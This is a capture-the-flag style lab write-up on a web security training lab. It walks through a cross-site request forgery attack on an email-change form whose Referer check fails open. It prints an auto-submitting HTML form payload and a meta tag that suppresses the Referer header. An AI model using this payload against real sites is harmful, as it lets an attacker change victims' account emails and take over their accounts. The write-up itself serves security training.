
# CSRF where Referer validation depends on header being present

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

There is a function to update the email:



![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/2.png)


It is a POST request with the “Referer” HTTP header:

First we generate the CSRF PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a250042033a996983bd0048004f00df.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


When opened, it returns this error:



![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/4.png)


Adding a line to avoid using the Referer header solves this problem:

```
<meta name="referrer" content="never">
```

```

      <meta name="referrer" content="never">
      <input type="hidden" name="email" value="test777&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
